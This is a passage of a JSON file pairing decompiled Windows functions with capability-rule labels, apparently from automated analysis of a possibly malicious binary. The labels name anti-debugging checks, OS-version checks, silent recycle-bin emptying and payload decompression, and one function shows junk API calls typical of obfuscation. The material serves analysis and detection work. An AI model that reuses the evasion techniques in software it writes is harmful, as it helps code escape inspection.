}\ncode_r0x00422484:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x42d594 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x42d594 < iVar12) {\n                if (iVar12 < *0x42d590) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x42d590;\n                    uVar5 = 1;\n                }\n                goto code_r0x0042283b;\n            }\n            var_10h = *0x42d594 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00422627;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00422627:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0042283b:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3658
    },
    "0042287e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042287e(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00422d7f;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x42d5b0 - 1;\n        iVar4 = *0x42d5b0 + (*0x42d5b0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x42d5b0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x004229b3;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x004229ba;\ncode_r0x004229b3:\n                        do {\n                            var_4h = 1;\ncode_r0x004229ba:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x004229c8;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x004229c8:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x42d5ac - *0x42d5b0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x42d5ac < iVar12) {\n                if (iVar12 < *0x42d5a8) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x42d5bc;\n                    iVar4 = *0x42d5b4 + (*0x42d5b4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x42d5b4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x42d5b4 + (*0x42d5b4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x42d5b4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x42d5bc + *0x42d5a8;\n                    uVar5 = 1;\n                }\n                goto code_r0x00422d7f;\n            }\n            var_10h = *0x42d5ac - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x42d5b0 - 1;\n            iVar12 = *0x42d5b0 + (*0x42d5b0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x42d5b0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00422b6b;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00422b6b:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x42d5b4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00422d7f:\n    var_20h = iVar12 << (0x1fU - *0x42d5b4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x42d5b8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x42d5b8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3688
    },
    "00401590": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401590(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar auStack136 [8];\n    uchar auStack128 [104];\n    uint uStack24;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x424d20;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    if ((param_1 != NULL) && (*param_1 == 0)) {\n        iVar1 = fcn.00404602(0x18);\n        uStack4 = 0;\n        if (iVar1 == 0) {\n            iVar3 = 0;\n        }\n        else {\n            uVar2 = fcn.004014a0();\n            uStack4 = CONCAT31(uStack4._1_3_, 1);\n            fcn.004011e0(auStack128, uVar2);\n            iVar3 = fcn.00401570();\n        }\n        uStack12 = 2;\n        *param_1 = iVar3;\n        if (iVar1 != 0) {\n            fcn.00401260(auStack136);\n            fcn.00401b70();\n        }\n    }\n    *in_FS_OFFSET = uStack24;\n    return 2;\n}\n",
        "token_count": 330
    },
    "004026f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004026f0(uint param_1, uint8_t param_2)\n\n{\n    fcn.00401480();\n    if ((param_2 & 1) != 0) {\n        fcn.0040450e(param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 69
    },
    "00402b50": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00402b50(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_ESI;\n    \n    if ((*(unaff_ESI + 0x40) & 1) != 0) {\n        iVar1 = fcn.00402990();\n        if (iVar1 == 0) {\n            iVar1 = fcn.004029a0();\n        }\n        else {\n            iVar1 = fcn.004029e0();\n        }\n        iVar2 = fcn.00402960();\n        uVar3 = fcn.00402960(iVar1 - iVar2);\n        fcn.00402910(uVar3);\n    }\n    fcn.004029c0();\n    fcn.00402a30();\n    *(unaff_ESI + 0x40) = *(unaff_ESI + 0x40) & 0xfffffffe;\n    *(unaff_ESI + 0x3c) = 0;\n    return;\n}\n",
        "token_count": 228
    },
    "00413412": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00413412(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004073fc(0x42a1a0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004073c6();\n        *puVar2 = 0;\n        puVar2 = fcn.004073b3();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x5fca118)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x5fca120;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00412a7e(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004073b3();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004073c6();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00412cdf(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004134e4(0x42a1a0);\n                goto code_r0x004134de;\n            }\n        }\n        puVar2 = fcn.004073c6();\n        *puVar2 = 0;\n        puVar2 = fcn.004073b3();\n        *puVar2 = 9;\n        fcn.004044cd(0, 0, 0, 0, 0);\n    }\ncode_r0x004134de:\n    fcn.00407441();\n    return;\n}\n",
        "token_count": 632
    },
    "004013a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004013a0(int32_t param_1)\n\n{\n    fcn.004036c7(0);\n    if (*(param_1 + 4) != -1) {\n        *(param_1 + 4) = *(param_1 + 4) + 1;\n    }\n    fcn.004036ef();\n    return;\n}\n",
        "token_count": 81
    },
    "004013d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004013d0(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.004036c7(0);\n    iVar1 = *(param_1 + 4);\n    if ((iVar1 != 0) && (iVar1 != -1)) {\n        *(param_1 + 4) = iVar1 + -1;\n    }\n    iVar1 = *(param_1 + 4);\n    fcn.004036ef();\n    return ~-(iVar1 != 0) & param_1;\n}\n",
        "token_count": 124
    },
    "00403090": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar * fcn.00403090(void)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    char *unaff_EBX;\n    uint *in_FS_OFFSET;\n    uchar auStack32 [4];\n    uint uStack28;\n    uint uStack20;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x424d38;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.004036c7(0);\n    pcVar1 = *0x5fca0c0;\n    uStack8 = 0;\n    fcn.00401360();\n    pcVar2 = fcn.004014c0();\n    if ((pcVar2 == NULL) && (pcVar2 = pcVar1,  pcVar1 == NULL)) {\n        iVar3 = fcn.00401590(&stack0xffffffdc);\n        if (iVar3 == -1) {\n            unaff_EBX = \"bad cast\";\n            fcn.004041ba(\"bad cast\");\n            fcn.00404f72(auStack32, 0x42a298);\n        }\n        *0x5fca0c0 = unaff_EBX;\n        fcn.004013a0();\n        fcn.00401410();\n        pcVar2 = unaff_EBX;\n    }\n    uStack20 = 0xffffffff;\n    fcn.004036ef();\n    *in_FS_OFFSET = uStack28;\n    return pcVar2;\n}\n",
        "token_count": 359
    },
    "00402e60": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00402e60(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint32_t var_8h;\n    int32_t var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x424c40;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar5 = var_8h | 0xf;\n    uVar1 = fcn.00402e40();\n    if (((uVar5 <= uVar1) && (uVar4 = *(in_ECX + 0x18) >> 1,  var_8h = uVar5,  uVar5 / 3 < uVar4)) &&\n       (*(in_ECX + 0x18) <= uVar1 - uVar4)) {\n        var_8h = uVar4 + *(in_ECX + 0x18);\n    }\n    var_4h = 0;\n    uVar2 = fcn.00402920(var_8h + 1);\n    if (var_ch != 0) {\n        uVar3 = fcn.00402d50(var_ch);\n        fcn.00403150(uVar2, var_8h + 1, uVar3);\n    }\n    fcn.004028a0(1, 0);\n    *(in_ECX + 4) = uVar2;\n    *(in_ECX + 0x18) = var_8h;\n    fcn.00402ca0(var_ch);\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 494
    },
    "00402ca0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402ca0(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uStack4;\n    \n    uStack4 = param_1 & 0xffffff;\n    *(param_1 + 0x14) = param_2;\n    iVar1 = fcn.00402d50(&uStack4 + 3);\n    fcn.00401050(iVar1 + param_2);\n    return;\n}\n",
        "token_count": 108
    },
    "0040ae63": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0040ae63(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint32_t *unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_ESI) {\n        if (*(unaff_EBP + -0x20) != unaff_ESI) {\n            puVar1 = *((*unaff_EDI >> 5) * 4 + 0x5fca120) + 4 + (*unaff_EDI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.00412b1e(*unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0041ffd0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.0041ffd0(uint32_t *param_1)\n\n{\n    uint32_t unaff_EBX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t *unaff_retaddr;\n    uint32_t uStack2104;\n    int32_t iStack2100;\n    int32_t iStack2096;\n    int32_t iStack2092;\n    int32_t iStack2088;\n    uchar auStack2084 [4];\n    int32_t iStack2080;\n    int32_t iStack2076;\n    uchar auStack2072 [8];\n    uchar auStack2064 [4];\n    uchar auStack2060 [4];\n    uchar auStack2056 [8];\n    uchar auStack2048 [2048];\n    \n    uVar1 = *param_1;\n    uStack2104 = param_1[1];\n    iVar2 = -0x3910c8e0;\n    iStack2096 = -0x3910c8e0;\n    iStack2080 = *0x42d3d0;\n    if (*0x5fca0b8 == 0x13f7) {\n        (*_sym.imp.KERNEL32.dll_BeginUpdateResourceW)(0, 0);\n    }\n    iStack2088 = *0x42d3d4;\n    iStack2092 = *0x42d3d8;\n    iStack2076 = *0x42d3dc;\n    if (*0x5fca0b8 == 0x786) {\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)(0, 0, 0, auStack2048, 0, &iStack2100, 0);\n    }\n    iStack2100 = 0x20;\n    do {\n        if (*0x5fca0b8 == 0x36f) {\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 